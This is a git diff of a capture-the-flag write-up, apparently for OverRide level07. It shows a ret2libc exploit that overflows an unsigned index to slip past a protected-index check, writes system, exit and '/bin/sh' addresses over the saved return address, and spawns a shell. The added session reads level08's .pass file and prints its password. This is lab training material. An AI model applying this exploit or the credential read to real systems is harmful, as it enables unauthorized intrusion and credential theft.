@@ -56,6 +56,8 @@ We know the following:
 - the program creates a data table, where it stores numbers at indexes
 - some indexes (index % 3 == 0) are protected
 
+### Build exploit
+
 Our plan is to do a ret2libc attack, by overwriting the index containing EIP with a call to ```system()``` + ```exit()``` + ```"/bin/sh"```. 
 
 1) find the address of system, exit, bin/sh
@@ -128,38 +130,46 @@ Next, we need to calculate the 'index' of our EIP address.
 
 114 % 3 = 0
 ```
-Ah... Index 114 is protected: ```114 % 3 = 0```. We can't store a number at this index. 
+Ah... index 114 is protected: ```114 % 3 = 0```. We can't store a number at this index. 
 
-On lines 152-158 of the disassembled binary, we see that the table is accessed as ```data[index\*4]```. 
+On lines 152-158 of the disassembled binary, we see that the table is accessed as ```data[index * 4]```. 
 Since the index is an unsigned int and multiplied by 4, we can overflow uintmax to give the index where we want to go. 
 ```
 0x100000000 = 2^32
 [size of uintmax]
 
 (2^32 / 4) + 114 = 1073741938
-                  [stores at index 114]
+                  [index 114, after overflow]
 
 1073741938 % 3 = 1
-               [ this index is unprotected! ]
+```
+Index 1073741938 is unprotected! 
+
+Let's test it out by causing the program to segfault. 
+```
+(gdb) run
+
+Input command: store
+ Number: 1094795585   # decimal for 0x41414141 or 'AAAA'
+ Index: 1073741938    # index 114
+ Completed store command successfully
+Input command: quit
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
 ```
 
-We're going to write our payload at the address of EIP. 
+So, let's structure our exploit:
 ```
 [ address of EIP ] = [ address of system ] [ address of exit ] [ address of "/bin/sh" ]
-   0xffffd6bc           0xf7e6aed0           0xf7e5eb70             0xf7f897ec
+   0xffffd6bc           0xf7e6aed0           0xf7e5eb70             0xf7f897ec          # address
+                        4159090384           4159040368             4160264172          # in decimal, to be number input
+                            |                     |                     |
+                        1073741938           115                    115                 # index to use
+                        data[114]            data[115]              data[116]   
 ```
 
-
-
-
-
-
-
-
-
-
-
-### Build exploit
+Let's give it a go!
 
 ```
 level07@OverRide:~$ ./level07
@@ -189,8 +199,6 @@ Input command: store
 Input command: quit
 $ whoami
 level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
 ```
-
-## Recreate Exploited Binary
-
-
